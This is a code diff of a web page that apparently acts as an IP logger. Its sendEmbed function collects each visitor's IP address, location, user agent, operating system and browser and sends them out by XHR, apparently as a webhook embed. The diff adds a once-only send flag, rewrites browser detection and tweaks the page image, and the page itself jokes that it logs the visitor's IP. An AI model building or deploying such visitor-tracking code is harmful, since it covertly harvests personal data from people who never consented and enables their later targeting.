@@ -22,7 +22,7 @@
             margin-bottom: 40px;
         }
         img {
-            position: absolute;
+            position: fixed;
             left: 50%;
             bottom: 0;
             transform: translateX(-50%);
@@ -74,6 +74,8 @@
         }
 
         function sendEmbed(ipAddress, locationData) {
+            if (embedSent) return; // If embed is already sent, return
+
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
             var os = detectOS(userAgent);
@@ -141,6 +143,7 @@
                 if (xhr.readyState === XMLHttpRequest.DONE) {
                     if (xhr.status === 200) {
                         console.log("Embed sent successfully!");
+                        embedSent = true; // Set embedSent to true after successfully sending the embed
                     } else {
                         console.error("Failed to send embed:", xhr.status, xhr.statusText);
                     }
@@ -166,34 +169,21 @@
         }
 
         function detectBrowser(userAgent) {
-            var browsers = [
-                'Chrome',
-                'Firefox',
-                'Safari',
-                'Edge',
-                'Opera',
-                'MSIE',
-                'Trident',
-                'Edge',
-                'Netscape',
-                'SeaMonkey',
-                'UCBrowser',
-                'Vivaldi',
-                'Yandex',
-                'Brave',
-                'Avant',
-                'Konqueror',
-                'Lunascape',
-                'Maxthon',
-                'Sleipnir',
-                'SlimBrowser'
-            ];
-
-            var detectedBrowser = browsers.find(function(browser) {
-                return userAgent.indexOf(browser) >= 0;
-            });
-
-            return detectedBrowser || 'Unknown';
+            var browser = "Unknown";
+            if (/edge/i.test(userAgent)) {
+                browser = "Edge";
+            } else if (/chrome/i.test(userAgent)) {
+                browser = "Chrome";
+            } else if (/firefox/i.test(userAgent)) {
+                browser = "Firefox";
+            } else if (/safari/i.test(userAgent)) {
+                browser = "Safari";
+            } else if (/opera|opr/i.test(userAgent)) {
+                browser = "Opera";
+            } else if (/msie|trident/i.test(userAgent)) {
+                browser = "Internet Explorer";
+            }
+            return browser;
         }
 
         function getDeviceType() {
@@ -219,6 +209,6 @@
 <body>
     <h1>Welcome to our awesome site!</h1>
     <p>Enjoy the music while we log your IP address.</p>
-    <img src="Paxz Shape.jpg" alt="Paxz Shape">
+    <img src="Paxz Shape.png" alt="Paxz Shape">
 </body>
 </html>
